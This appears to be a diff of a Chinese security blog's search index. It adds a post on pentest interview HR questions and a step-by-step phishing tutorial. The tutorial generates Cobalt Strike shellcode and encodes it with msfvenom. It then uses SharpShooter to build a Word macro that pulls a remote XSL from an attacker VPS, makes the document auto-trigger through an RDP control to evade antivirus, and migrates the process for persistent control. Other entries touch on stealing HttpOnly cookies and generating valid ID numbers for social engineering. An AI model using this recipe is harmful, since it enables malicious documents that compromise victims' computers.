@@ -54,6 +54,60 @@
       </tags>
   </entry>
   <entry>
+    <title>远程加载XSL文件达到免杀并增加文档迷惑性</title>
+    <url>/2020/04/10/%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BDXSL%E6%96%87%E4%BB%B6%E8%BE%BE%E5%88%B0%E5%85%8D%E6%9D%80%E5%B9%B6%E5%A2%9E%E5%8A%A0%E6%96%87%E6%A1%A3%E8%BF%B7%E6%83%91%E6%80%A7/</url>
+    <content><![CDATA[<p>从uknow师傅这看到的，自己动手做了一遍记录一下。原文在<a href="https://uknowsec.cn/posts/notes/%E5%8A%A0%E8%BD%BD%E8%BF%9C%E7%A8%8BXSL%E6%96%87%E4%BB%B6%E7%9A%84%E5%AE%8F%E5%85%8D%E6%9D%80%E6%96%B9%E6%B3%95.html" target="_blank" rel="noopener">这里</a></p><a id="more"></a>
+<p>在本文中删除了uknow师傅通过编辑宏来触发上线的哪一段，经过试验，个人觉得其后面一部分实用性强一点。遂保留记录。</p>
+<h3 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h3><p>首先使用Cobalt Strike或者Metasploit生成二进制格式的shellcode，即后缀为bin的文件。<br>此处以CS为例：</p>
+<p><img src="https://i.loli.net/2020/04/10/8C9762cBgzAf4Fr.png" alt="Image 1.png"></p>
+<h3 id="处理payload"><a href="#处理payload" class="headerlink" title="处理payload"></a>处理payload</h3><p>因为SharpShooter要求shellcode中不能含有空字节。所以使用msfvenom对payload.bin进行处理生成shellcode-encoded.bin文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p generic/custom PAYLOADFILE=./payload.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-encoded.bin -b &quot;\x00&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/04/10/iQ5RjdSMas7hFqJ.png" alt="Image 3.png"></p>
+<h3 id="生成xsl和macro"><a href="#生成xsl和macro" class="headerlink" title="生成xsl和macro"></a>生成xsl和macro</h3><p>将<a href="https://github.com/mdsecactivebreach/SharpShooter" target="_blank" rel="noopener">SharpShooter</a>下载到本地然后安装好依赖，建议使用python2安装</p>
+<p>将shellcode-encoded.bin文件放置脚本同目录下</p>
+<p>使用如下命令生成xsl文件和macro文件（需要修改vps地址）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SharpShooter.py --stageless --dotnetver 4 --payload macro --output foo --rawscfile shellcode-encoded.bin --com xslremote --awlurl http://*.*.*.*:8080/foo.xsl</span><br></pre></td></tr></table></figure>
+<p>简单介绍一下上面的几个参数：</p>
+<ul>
+<li>dotnetver：为目标的.net版本，可选2或者4</li>
+<li>awlurl： 为xsl存放地址</li>
+</ul>
+<p><img src="https://i.loli.net/2020/04/10/2CGjrJKfUYT38W5.png" alt="Image 5.png"></p>
+<p>生成的foo.macro内容大致如下：</p>
+<p><img src="https://i.loli.net/2020/04/10/9EjfVMCztrQ2TFi.png" alt="Image 6.png"></p>
+<p>生成的foo.xsl内容大致如下：</p>
+<p><img src="https://i.loli.net/2020/04/10/4EBGrJ3Hb2fp7OY.png" alt="Image 7.png"></p>
+<h3 id="迷惑性处理"><a href="#迷惑性处理" class="headerlink" title="迷惑性处理"></a>迷惑性处理</h3><p>将foo.xsl文件上传至vps，并开启http服务</p>
+<p><img src="https://i.loli.net/2020/04/10/L1KynkS2IvXmMDj.png" alt="Image 8.png"></p>
+<p>新建一个 启用宏的Word文档 ，进入开发工具，选择旧式控件 — 其他控件 — Microsoft RDP Client Control *（文章中使用的是version 2）</p>
+<p><img src="https://i.loli.net/2020/04/10/qsL3fIoN6urG8ed.png" alt="Image 15.png"></p>
+<p><img src="https://i.loli.net/2020/04/10/aH73KhRABXdyoCI.png" alt="Image 16.png"></p>
+<p>右键属性，将server值填为localhost，将StartConnection值填为1，即点开自启动</p>
+<p><img src="https://i.loli.net/2020/04/10/SXvtBiUxMW3RuLO.png" alt="Image 9.png"></p>
+<p>再右键查看代码，将foo.macro中间部分的代码填入其中</p>
+<p><img src="https://i.loli.net/2020/04/10/L7YGtK6QcAueWBg.png" alt="Image 17.png"></p>
+<p>如下图所示：</p>
+<p><img src="https://i.loli.net/2020/04/10/UFbhyoce8MnQLZK.png" alt="Image 10.png"></p>
+<p>保存后再次打开，可以看到已经显示为 “部分活动内容已被禁用” </p>
+<p><img src="https://i.loli.net/2020/04/10/6xtpGIT83Fd4qyB.png" alt="Image 11.png"></p>
+<p>若点击启用内容，即可看到已经上线。</p>
+<h3 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h3><p>虽然上线成功，但是可以注意到上一下会就掉线了，按uknow老哥文章所说：office宏加载远程的.xsl文件有个缺点就是，点击启用宏后word进程会崩掉，如word进程被结束了，Cobalt Strike或者Metasploit会掉线。</p>
+<p>所以这里需要进行自动进程迁移。<br>处理方法：</p>
+<ul>
+<li>Cobalt Strike：通过插件实现上线后自动迁移进程， <a href="https://github.com/threatexpress/aggressor-scripts/tree/d6bdbd587379d7da2a337d19cccdee1a8628d1d8/beacon_handler" target="_blank" rel="noopener">Beacon Handler Suite</a></li>
+<li>Metasploit: 在设置监听的时间可以设置：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set autorunscript migrate -N explorer.exe 或 set autorunscript -f</span><br></pre></td></tr></table></figure>
+
+<p>这样可以实现在word进程被关闭后，得到一个新的会话，即持久的控制目标。</p>
+<p>将beacon_handler文件下载下来后，修改init.cna中第37行为true，开启beacon自动进程迁移，其他的看着改吧。（我这里还改了sleep时间）</p>
+<p><img src="https://i.loli.net/2020/04/10/sMrVwBc4PC8GRk7.png" alt="Image 18.png"></p>
+]]></content>
+      <tags>
+        <tag>钓鱼</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Python做身份证合法性验证</title>
     <url>/2020/01/15/Python%E5%81%9A%E8%BA%AB%E4%BB%BD%E8%AF%81%E5%90%88%E6%B3%95%E6%80%A7%E9%AA%8C%E8%AF%81/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>发现一个好玩的<a href="https://zhuanlan.zhihu.com/p/101334480" target="_blank" rel="noopener">文章</a>， 文章中通过time模块遍历某一年份的所有日期，再根据身份证前6位和后4位以及id_validator模块来筛选出合法的身份证号。以后社工的时候可能用得到。</p><a id="more"></a>
@@ -303,6 +357,86 @@
       </tags>
   </entry>
   <entry>
+    <title>个人准备渗透测试和安全面试的经验之谈（1）</title>
+    <url>/2019/11/11/%E4%B8%AA%E4%BA%BA%E5%87%86%E5%A4%87%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%92%8C%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95%E7%9A%84%E7%BB%8F%E9%AA%8C%E4%B9%8B%E8%B0%88%EF%BC%881%EF%BC%89/</url>
+    <content><![CDATA[<blockquote>
+<p>文章摘选自<br><a href="https://github.com/Leezj9671/Pentest_Interview/blob/master/HR%E9%97%AE%E9%A2%98.md" target="_blank" rel="noopener">https://github.com/Leezj9671/Pentest_Interview/blob/master/HR%E9%97%AE%E9%A2%98.md</a></p>
+</blockquote><a id="more"></a>
+<ul>
+<li><a href="#hr面">HR面</a><ul>
+<li><a href="#问题">问题</a><ul>
+<li><a href="#对我们公司有什么了解为什么选择本公司">对我们公司有什么了解，为什么选择本公司</a></li>
+<li><a href="#为什么想要应聘这个职位">为什么想要应聘这个职位</a></li>
+<li><a href="#对安全服务是怎么理解的">对安全服务是怎么理解的</a></li>
+<li><a href="#如果我不知道渗透测试两分钟说一下">如果我不知道渗透测试，两分钟说一下</a></li>
+<li><a href="#如果我是一个汽车厂商你如何证明你的工作是有意义的">如果我是一个汽车厂商，你如何证明你的工作是有意义的？</a></li>
+<li><a href="#作为应届生你如何能胜任该职位">作为应届生，你如何能胜任该职位</a></li>
+<li><a href="#你有什么职业规划">你有什么职业规划</a></li>
+<li><a href="#如果离职的话是因为什么原因">如果离职的话是因为什么原因</a></li>
+<li><a href="#你有什么优缺点">你有什么优缺点</a></li>
+<li><a href="#对于薪资的要求">对于薪资的要求</a></li>
+<li><a href="#给不了这么多工资可以接受吗为什么想要这个数">给不了这么多工资可以接受吗？为什么想要这个数？</a></li>
+<li><a href="#进入部门后你需要多长时间进入项目">进入部门后，你需要多长时间进入项目？</a></li>
+<li><a href="#上一个面试的人能力跟你差不多但是工资方面比你要的低">上一个面试的人能力跟你差不多，但是工资方面比你要的低？</a></li>
+<li><a href="#是否可以接受加班">是否可以接受加班</a></li>
+<li><a href="#沟通能力和领导同事产生分歧会怎么办">（沟通能力）和领导、同事产生分歧会怎么办</a></li>
+<li><a href="#工作一段时间后，发现工作不是想象中的，会怎么办/对跳槽的看法">工作一段时间后，发现工作不是想象中的，会怎么办/对跳槽的看法</a></li>
+<li><a href="#对上司有什么要求喜欢和什么样的领导合作">对上司有什么要求？喜欢和什么样的领导合作？</a></li>
+<li><a href="#最有影响的一件事人">最有影响的一件事/人</a></li>
+<li><a href="#你还要问什么问题">你还要问什么问题</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="HR面"><a href="#HR面" class="headerlink" title="HR面"></a>HR面</h1><p>注意！HR面试的时候会有非常多的坑，熟悉我在这里写的问题，回答的时候情商高一点，不要跟HR吵起来，也不要有不合时宜的意见分歧，这个度的把控最好自己能让同学、朋友担任面试官，让他们多多挑你的刺，从而不断练习自己的反应能力。技术面试通过的，在HR这边通不过的例子是有很多的！</p>
+<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><h3 id="对我们公司有什么了解，为什么选择本公司"><a href="#对我们公司有什么了解，为什么选择本公司" class="headerlink" title="对我们公司有什么了解，为什么选择本公司"></a>对我们公司有什么了解，为什么选择本公司</h3><p>在信息安全行业比较知名，了解过公司的xx产品。（每次面试某个公司，都要花5-10分钟了解该公司的产品）</p>
+<h3 id="为什么想要应聘这个职位"><a href="#为什么想要应聘这个职位" class="headerlink" title="为什么想要应聘这个职位"></a>为什么想要应聘这个职位</h3><p>从我的经历上可以很清楚地看到我对网络安全的浓厚兴趣，我认为对本职工作有兴趣的人才能更好地完成这个工作。另外也有一句话说得很棒，“你之所以看不见黑暗，是因为有人拼命把它挡在你看不到的地方”，我认为做信息安全的尤其是渗透测试，就是为了更好地保护用户的安全，防患于未然，也是我想要应聘这个岗位的理由。（不要照背，体现自己的热爱和专业能力）</p>
+<h3 id="对安全服务是怎么理解的"><a href="#对安全服务是怎么理解的" class="headerlink" title="对安全服务是怎么理解的"></a>对安全服务是怎么理解的</h3><p>安全服务对象是人， 渗透测试对象是网站。（我的理解）</p>
+<ul>
+<li>安全概念和资讯</li>
+<li>安全工具使用</li>
+<li>渗透测试</li>
+<li>安全基线检查</li>
+<li>应急响应</li>
+<li>代码审计</li>
+<li>安全边界建设</li>
+<li>安全规范 </li>
+</ul>
+<h3 id="如果我不知道渗透测试，两分钟说一下"><a href="#如果我不知道渗透测试，两分钟说一下" class="headerlink" title="如果我不知道渗透测试，两分钟说一下"></a>如果我不知道渗透测试，两分钟说一下</h3><p>（此处自行组织语言，力求能将渗透测试讲得浅显易懂，时间控制在三分钟以内）</p>
+<h3 id="如果我是一个汽车厂商，你如何证明你的工作是有意义的？"><a href="#如果我是一个汽车厂商，你如何证明你的工作是有意义的？" class="headerlink" title="如果我是一个汽车厂商，你如何证明你的工作是有意义的？"></a>如果我是一个汽车厂商，你如何证明你的工作是有意义的？</h3><p>（对于不懂得安全的人来说，怎么能说服他需要进行渗透测试，渗透测试有什么作用）</p>
+<h3 id="作为应届生，你如何能胜任该职位"><a href="#作为应届生，你如何能胜任该职位" class="headerlink" title="作为应届生，你如何能胜任该职位"></a>作为应届生，你如何能胜任该职位</h3><p>正如前方所说，我学习能力很强，主观能动性强，能很快地做好下派的任务，所以我认为我能很好地胜任这个职位</p>
+<h3 id="你有什么职业规划"><a href="#你有什么职业规划" class="headerlink" title="你有什么职业规划"></a>你有什么职业规划</h3><p>渗透测试工程师-&gt;渗透测试项目负责人-&gt;安全架构师（安全咨询顾问）</p>
+<h3 id="如果离职的话是因为什么原因"><a href="#如果离职的话是因为什么原因" class="headerlink" title="如果离职的话是因为什么原因"></a>如果离职的话是因为什么原因</h3><p>个人规划和公司有冲突，缺少上升空间。（就算是因为钱少、和同事 <del>打架</del> 不和，也不要明说……）</p>
+<h3 id="你有什么优缺点"><a href="#你有什么优缺点" class="headerlink" title="你有什么优缺点"></a>你有什么优缺点</h3><ul>
+<li>优点：对网络安全十分热爱，抗压能力强，学习能力强，责任感强</li>
+<li>缺点：遇到技术难点时可能会一直钻研，可能会耽搁到其它事情 （情商高一点，不要真的说自己的缺点）</li>
+</ul>
+<h3 id="对于薪资的要求"><a href="#对于薪资的要求" class="headerlink" title="对于薪资的要求"></a>对于薪资的要求</h3><p>月薪13-15K，可以接受1k的浮动</p>
+<h3 id="给不了这么多工资可以接受吗？为什么想要这个数？"><a href="#给不了这么多工资可以接受吗？为什么想要这个数？" class="headerlink" title="给不了这么多工资可以接受吗？为什么想要这个数？"></a>给不了这么多工资可以接受吗？为什么想要这个数？</h3><ol>
+<li>贵公司和我其实比较契合，我可以接受月薪1k左右的浮动。（表明自己的接受范围和立场）</li>
+<li>可能我某些方面表现得不够好或者表达不清晰，让您觉得我的能力不够。您可以根据这些点再问我几个问题。（表明自己对自身的判断，认为自己值得这个数，委婉提示面试官可能判断有误）</li>
+<li>通过贵司的招聘信息和整个市场平均水平看，我认为我岗位匹配度比较好，值得这个工资水平。（明确回答，要有自信）<br>（这个问题千万不要顶嘴或拍桌走人，可参考我的知乎回答 面试想拿 10K，HR 说你只值 7K，该怎样回答或者反驳？ - 李与归的回答 - 知乎 <a href="https://www.zhihu.com/question/282880854/answer/432987673" target="_blank" rel="noopener">https://www.zhihu.com/question/282880854/answer/432987673</a> ）</li>
+</ol>
+<h3 id="进入部门后，你需要多长时间进入项目？"><a href="#进入部门后，你需要多长时间进入项目？" class="headerlink" title="进入部门后，你需要多长时间进入项目？"></a>进入部门后，你需要多长时间进入项目？</h3><p>（表达自己的快速学习能力）</p>
+<h3 id="上一个面试的人能力跟你差不多，但是工资方面比你要的低？"><a href="#上一个面试的人能力跟你差不多，但是工资方面比你要的低？" class="headerlink" title="上一个面试的人能力跟你差不多，但是工资方面比你要的低？"></a>上一个面试的人能力跟你差不多，但是工资方面比你要的低？</h3><p>（表达综合素质方面，比如沟通能力好、领导能力好、文档能力好等等）</p>
+<h3 id="是否可以接受加班"><a href="#是否可以接受加班" class="headerlink" title="是否可以接受加班"></a>是否可以接受加班</h3><p>加班肯定是不可避免的，我可以接受项目需求的加班，毕竟完成工作是员工所要尽到的责任。同时我也会提高自己的工作效率，配合完成工作。（同样的，情商高一点，口头说要加班，入职之后要不要加班不就是……:&gt;）</p>
+<h3 id="（沟通能力）和领导、同事产生分歧会怎么办"><a href="#（沟通能力）和领导、同事产生分歧会怎么办" class="headerlink" title="（沟通能力）和领导、同事产生分歧会怎么办"></a>（沟通能力）和领导、同事产生分歧会怎么办</h3><p>出现分歧是十分正常的事情，产生分歧很有可能是双方理解不一样，如何有效沟通、相互理解才是重中之重。在我看来还是会以大局出发，以有益于公司和客户的方向出发。</p>
+<h3 id="工作一段时间后，发现工作不是想象中的，会怎么办-对跳槽的看法"><a href="#工作一段时间后，发现工作不是想象中的，会怎么办-对跳槽的看法" class="headerlink" title="工作一段时间后，发现工作不是想象中的，会怎么办/对跳槽的看法"></a>工作一段时间后，发现工作不是想象中的，会怎么办/对跳槽的看法</h3><p>我在找工作之前，都会了解好这份工作的具体职责，如果我工作一段时间后发现工作不是想象中的，那只能说明我的职业目标不够清晰。（圆滑点）</p>
+<h3 id="对上司有什么要求？喜欢和什么样的领导合作？"><a href="#对上司有什么要求？喜欢和什么样的领导合作？" class="headerlink" title="对上司有什么要求？喜欢和什么样的领导合作？"></a>对上司有什么要求？喜欢和什么样的领导合作？</h3><p>我来求职都是为了能找到一个希望能提升自己的平台，我希望更能找到一个技术经验丰富的领导。</p>
+<h3 id="最有影响的一件事-人"><a href="#最有影响的一件事-人" class="headerlink" title="最有影响的一件事/人"></a>最有影响的一件事/人</h3><p>（最好是在安全领域方面的，说上一些黑客事件，表明自己热爱安全领域）</p>
+<h3 id="你还要问什么问题"><a href="#你还要问什么问题" class="headerlink" title="你还要问什么问题"></a>你还要问什么问题</h3><ul>
+<li>有没有岗位晋升机制，入职培训项目，员工培训提升项目？考证有没有报销？</li>
+<li>五险一金、社保比例、饭补、餐补、交通补助？</li>
+<li>应聘岗位具体职责和工作内容？会不会经常出差？</li>
+<li>试用期多久？薪水多少？</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>面试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>个人准备渗透测试和安全面试的经验之谈（2）</title>
     <url>/2019/11/11/%E4%B8%AA%E4%BA%BA%E5%87%86%E5%A4%87%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%92%8C%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95%E7%9A%84%E7%BB%8F%E9%AA%8C%E4%B9%8B%E8%B0%88%EF%BC%882%EF%BC%89/</url>
     <content><![CDATA[<blockquote>
@@ -447,86 +581,6 @@
 <p>Django出现过目录遍历漏洞</p>
 <h3 id="业务逻辑漏洞，用户任意密码重置举出有什么例子，因为什么因素导致的？"><a href="#业务逻辑漏洞，用户任意密码重置举出有什么例子，因为什么因素导致的？" class="headerlink" title="业务逻辑漏洞，用户任意密码重置举出有什么例子，因为什么因素导致的？"></a>业务逻辑漏洞，用户任意密码重置举出有什么例子，因为什么因素导致的？</h3><h3 id="PHP代码审计？开源的代码审计有没有做过？弱类型比较，反序列化漏洞这种考点在哪？"><a href="#PHP代码审计？开源的代码审计有没有做过？弱类型比较，反序列化漏洞这种考点在哪？" class="headerlink" title="PHP代码审计？开源的代码审计有没有做过？弱类型比较，反序列化漏洞这种考点在哪？"></a>PHP代码审计？开源的代码审计有没有做过？弱类型比较，反序列化漏洞这种考点在哪？</h3><h3 id="HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie"><a href="#HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie" class="headerlink" title="HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie"></a>HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie</h3><p>Http Trace攻击就可以将你的Header里的Cookie回显出来，利用Ajax或者flash就可以完成这种攻击；或者配置或者应用程序上可能Bypass，比如header头的泄漏</p>
 <h2 id="盛邦"><a href="#盛邦" class="headerlink" title="盛邦"></a>盛邦</h2><h3 id="有没有做过协议分析和抓包分析"><a href="#有没有做过协议分析和抓包分析" class="headerlink" title="有没有做过协议分析和抓包分析"></a>有没有做过协议分析和抓包分析</h3><h2 id="翼果"><a href="#翼果" class="headerlink" title="翼果"></a>翼果</h2><h3 id="mysql查看版本？"><a href="#mysql查看版本？" class="headerlink" title="mysql查看版本？"></a>mysql查看版本？</h3><h3 id="过安全狗"><a href="#过安全狗" class="headerlink" title="过安全狗"></a>过安全狗</h3><h3 id="编程能力-平台逆向-修改程序入口-rootkit有没有研究过"><a href="#编程能力-平台逆向-修改程序入口-rootkit有没有研究过" class="headerlink" title="编程能力/平台逆向/修改程序入口/rootkit有没有研究过"></a>编程能力/平台逆向/修改程序入口/rootkit有没有研究过</h3>]]></content>
-      <tags>
-        <tag>面试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>个人准备渗透测试和安全面试的经验之谈（1）</title>
-    <url>/2019/11/11/%E4%B8%AA%E4%BA%BA%E5%87%86%E5%A4%87%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%92%8C%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95%E7%9A%84%E7%BB%8F%E9%AA%8C%E4%B9%8B%E8%B0%88%EF%BC%881%EF%BC%89/</url>
-    <content><![CDATA[<blockquote>
-<p>文章摘选自<br><a href="https://github.com/Leezj9671/Pentest_Interview/blob/master/HR%E9%97%AE%E9%A2%98.md" target="_blank" rel="noopener">https://github.com/Leezj9671/Pentest_Interview/blob/master/HR%E9%97%AE%E9%A2%98.md</a></p>
-</blockquote><a id="more"></a>
-<ul>
-<li><a href="#hr面">HR面</a><ul>
-<li><a href="#问题">问题</a><ul>
-<li><a href="#对我们公司有什么了解为什么选择本公司">对我们公司有什么了解，为什么选择本公司</a></li>
-<li><a href="#为什么想要应聘这个职位">为什么想要应聘这个职位</a></li>
-<li><a href="#对安全服务是怎么理解的">对安全服务是怎么理解的</a></li>
-<li><a href="#如果我不知道渗透测试两分钟说一下">如果我不知道渗透测试，两分钟说一下</a></li>
-<li><a href="#如果我是一个汽车厂商你如何证明你的工作是有意义的">如果我是一个汽车厂商，你如何证明你的工作是有意义的？</a></li>
-<li><a href="#作为应届生你如何能胜任该职位">作为应届生，你如何能胜任该职位</a></li>
-<li><a href="#你有什么职业规划">你有什么职业规划</a></li>
-<li><a href="#如果离职的话是因为什么原因">如果离职的话是因为什么原因</a></li>
-<li><a href="#你有什么优缺点">你有什么优缺点</a></li>
-<li><a href="#对于薪资的要求">对于薪资的要求</a></li>
-<li><a href="#给不了这么多工资可以接受吗为什么想要这个数">给不了这么多工资可以接受吗？为什么想要这个数？</a></li>
-<li><a href="#进入部门后你需要多长时间进入项目">进入部门后，你需要多长时间进入项目？</a></li>
-<li><a href="#上一个面试的人能力跟你差不多但是工资方面比你要的低">上一个面试的人能力跟你差不多，但是工资方面比你要的低？</a></li>
-<li><a href="#是否可以接受加班">是否可以接受加班</a></li>
-<li><a href="#沟通能力和领导同事产生分歧会怎么办">（沟通能力）和领导、同事产生分歧会怎么办</a></li>
-<li><a href="#工作一段时间后，发现工作不是想象中的，会怎么办/对跳槽的看法">工作一段时间后，发现工作不是想象中的，会怎么办/对跳槽的看法</a></li>
-<li><a href="#对上司有什么要求喜欢和什么样的领导合作">对上司有什么要求？喜欢和什么样的领导合作？</a></li>
-<li><a href="#最有影响的一件事人">最有影响的一件事/人</a></li>
-<li><a href="#你还要问什么问题">你还要问什么问题</a></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h1 id="HR面"><a href="#HR面" class="headerlink" title="HR面"></a>HR面</h1><p>注意！HR面试的时候会有非常多的坑，熟悉我在这里写的问题，回答的时候情商高一点，不要跟HR吵起来，也不要有不合时宜的意见分歧，这个度的把控最好自己能让同学、朋友担任面试官，让他们多多挑你的刺，从而不断练习自己的反应能力。技术面试通过的，在HR这边通不过的例子是有很多的！</p>
-<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><h3 id="对我们公司有什么了解，为什么选择本公司"><a href="#对我们公司有什么了解，为什么选择本公司" class="headerlink" title="对我们公司有什么了解，为什么选择本公司"></a>对我们公司有什么了解，为什么选择本公司</h3><p>在信息安全行业比较知名，了解过公司的xx产品。（每次面试某个公司，都要花5-10分钟了解该公司的产品）</p>
-<h3 id="为什么想要应聘这个职位"><a href="#为什么想要应聘这个职位" class="headerlink" title="为什么想要应聘这个职位"></a>为什么想要应聘这个职位</h3><p>从我的经历上可以很清楚地看到我对网络安全的浓厚兴趣，我认为对本职工作有兴趣的人才能更好地完成这个工作。另外也有一句话说得很棒，“你之所以看不见黑暗，是因为有人拼命把它挡在你看不到的地方”，我认为做信息安全的尤其是渗透测试，就是为了更好地保护用户的安全，防患于未然，也是我想要应聘这个岗位的理由。（不要照背，体现自己的热爱和专业能力）</p>
-<h3 id="对安全服务是怎么理解的"><a href="#对安全服务是怎么理解的" class="headerlink" title="对安全服务是怎么理解的"></a>对安全服务是怎么理解的</h3><p>安全服务对象是人， 渗透测试对象是网站。（我的理解）</p>
-<ul>
-<li>安全概念和资讯</li>
-<li>安全工具使用</li>
-<li>渗透测试</li>
-<li>安全基线检查</li>
-<li>应急响应</li>
-<li>代码审计</li>
-<li>安全边界建设</li>
-<li>安全规范 </li>
-</ul>
-<h3 id="如果我不知道渗透测试，两分钟说一下"><a href="#如果我不知道渗透测试，两分钟说一下" class="headerlink" title="如果我不知道渗透测试，两分钟说一下"></a>如果我不知道渗透测试，两分钟说一下</h3><p>（此处自行组织语言，力求能将渗透测试讲得浅显易懂，时间控制在三分钟以内）</p>
-<h3 id="如果我是一个汽车厂商，你如何证明你的工作是有意义的？"><a href="#如果我是一个汽车厂商，你如何证明你的工作是有意义的？" class="headerlink" title="如果我是一个汽车厂商，你如何证明你的工作是有意义的？"></a>如果我是一个汽车厂商，你如何证明你的工作是有意义的？</h3><p>（对于不懂得安全的人来说，怎么能说服他需要进行渗透测试，渗透测试有什么作用）</p>
-<h3 id="作为应届生，你如何能胜任该职位"><a href="#作为应届生，你如何能胜任该职位" class="headerlink" title="作为应届生，你如何能胜任该职位"></a>作为应届生，你如何能胜任该职位</h3><p>正如前方所说，我学习能力很强，主观能动性强，能很快地做好下派的任务，所以我认为我能很好地胜任这个职位</p>
-<h3 id="你有什么职业规划"><a href="#你有什么职业规划" class="headerlink" title="你有什么职业规划"></a>你有什么职业规划</h3><p>渗透测试工程师-&gt;渗透测试项目负责人-&gt;安全架构师（安全咨询顾问）</p>
-<h3 id="如果离职的话是因为什么原因"><a href="#如果离职的话是因为什么原因" class="headerlink" title="如果离职的话是因为什么原因"></a>如果离职的话是因为什么原因</h3><p>个人规划和公司有冲突，缺少上升空间。（就算是因为钱少、和同事 <del>打架</del> 不和，也不要明说……）</p>
-<h3 id="你有什么优缺点"><a href="#你有什么优缺点" class="headerlink" title="你有什么优缺点"></a>你有什么优缺点</h3><ul>
-<li>优点：对网络安全十分热爱，抗压能力强，学习能力强，责任感强</li>
-<li>缺点：遇到技术难点时可能会一直钻研，可能会耽搁到其它事情 （情商高一点，不要真的说自己的缺点）</li>
-</ul>
-<h3 id="对于薪资的要求"><a href="#对于薪资的要求" class="headerlink" title="对于薪资的要求"></a>对于薪资的要求</h3><p>月薪13-15K，可以接受1k的浮动</p>
-<h3 id="给不了这么多工资可以接受吗？为什么想要这个数？"><a href="#给不了这么多工资可以接受吗？为什么想要这个数？" class="headerlink" title="给不了这么多工资可以接受吗？为什么想要这个数？"></a>给不了这么多工资可以接受吗？为什么想要这个数？</h3><ol>
-<li>贵公司和我其实比较契合，我可以接受月薪1k左右的浮动。（表明自己的接受范围和立场）</li>
-<li>可能我某些方面表现得不够好或者表达不清晰，让您觉得我的能力不够。您可以根据这些点再问我几个问题。（表明自己对自身的判断，认为自己值得这个数，委婉提示面试官可能判断有误）</li>
-<li>通过贵司的招聘信息和整个市场平均水平看，我认为我岗位匹配度比较好，值得这个工资水平。（明确回答，要有自信）<br>（这个问题千万不要顶嘴或拍桌走人，可参考我的知乎回答 面试想拿 10K，HR 说你只值 7K，该怎样回答或者反驳？ - 李与归的回答 - 知乎 <a href="https://www.zhihu.com/question/282880854/answer/432987673" target="_blank" rel="noopener">https://www.zhihu.com/question/282880854/answer/432987673</a> ）</li>
-</ol>
-<h3 id="进入部门后，你需要多长时间进入项目？"><a href="#进入部门后，你需要多长时间进入项目？" class="headerlink" title="进入部门后，你需要多长时间进入项目？"></a>进入部门后，你需要多长时间进入项目？</h3><p>（表达自己的快速学习能力）</p>
-<h3 id="上一个面试的人能力跟你差不多，但是工资方面比你要的低？"><a href="#上一个面试的人能力跟你差不多，但是工资方面比你要的低？" class="headerlink" title="上一个面试的人能力跟你差不多，但是工资方面比你要的低？"></a>上一个面试的人能力跟你差不多，但是工资方面比你要的低？</h3><p>（表达综合素质方面，比如沟通能力好、领导能力好、文档能力好等等）</p>
-<h3 id="是否可以接受加班"><a href="#是否可以接受加班" class="headerlink" title="是否可以接受加班"></a>是否可以接受加班</h3><p>加班肯定是不可避免的，我可以接受项目需求的加班，毕竟完成工作是员工所要尽到的责任。同时我也会提高自己的工作效率，配合完成工作。（同样的，情商高一点，口头说要加班，入职之后要不要加班不就是……:&gt;）</p>
-<h3 id="（沟通能力）和领导、同事产生分歧会怎么办"><a href="#（沟通能力）和领导、同事产生分歧会怎么办" class="headerlink" title="（沟通能力）和领导、同事产生分歧会怎么办"></a>（沟通能力）和领导、同事产生分歧会怎么办</h3><p>出现分歧是十分正常的事情，产生分歧很有可能是双方理解不一样，如何有效沟通、相互理解才是重中之重。在我看来还是会以大局出发，以有益于公司和客户的方向出发。</p>
-<h3 id="工作一段时间后，发现工作不是想象中的，会怎么办-对跳槽的看法"><a href="#工作一段时间后，发现工作不是想象中的，会怎么办-对跳槽的看法" class="headerlink" title="工作一段时间后，发现工作不是想象中的，会怎么办/对跳槽的看法"></a>工作一段时间后，发现工作不是想象中的，会怎么办/对跳槽的看法</h3><p>我在找工作之前，都会了解好这份工作的具体职责，如果我工作一段时间后发现工作不是想象中的，那只能说明我的职业目标不够清晰。（圆滑点）</p>
-<h3 id="对上司有什么要求？喜欢和什么样的领导合作？"><a href="#对上司有什么要求？喜欢和什么样的领导合作？" class="headerlink" title="对上司有什么要求？喜欢和什么样的领导合作？"></a>对上司有什么要求？喜欢和什么样的领导合作？</h3><p>我来求职都是为了能找到一个希望能提升自己的平台，我希望更能找到一个技术经验丰富的领导。</p>
-<h3 id="最有影响的一件事-人"><a href="#最有影响的一件事-人" class="headerlink" title="最有影响的一件事/人"></a>最有影响的一件事/人</h3><p>（最好是在安全领域方面的，说上一些黑客事件，表明自己热爱安全领域）</p>
-<h3 id="你还要问什么问题"><a href="#你还要问什么问题" class="headerlink" title="你还要问什么问题"></a>你还要问什么问题</h3><ul>
-<li>有没有岗位晋升机制，入职培训项目，员工培训提升项目？考证有没有报销？</li>
-<li>五险一金、社保比例、饭补、餐补、交通补助？</li>
